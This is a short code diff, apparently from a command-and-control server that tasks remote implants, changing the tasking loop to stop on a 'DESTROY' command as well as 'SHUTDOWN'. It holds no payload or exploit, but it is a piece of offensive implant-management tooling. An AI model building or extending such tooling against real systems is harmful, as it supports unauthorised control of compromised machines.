@@ -160,7 +160,7 @@ def _handle_implant(conn, addr):
                 result = session._push(command, payload)
                 log.info("  TASK     %s  %s  OK", implant_id, command)
                 result_q.put({"status": "ok", "result": result})
-                if command == "SHUTDOWN":
+                if command in ("SHUTDOWN", "DESTROY"):
                     break
             except (ConnectionError, OSError, BrokenPipeError) as exc:
                 log.info("  TASK     %s  %s  SOCKET_DEAD %s", implant_id, command, exc)
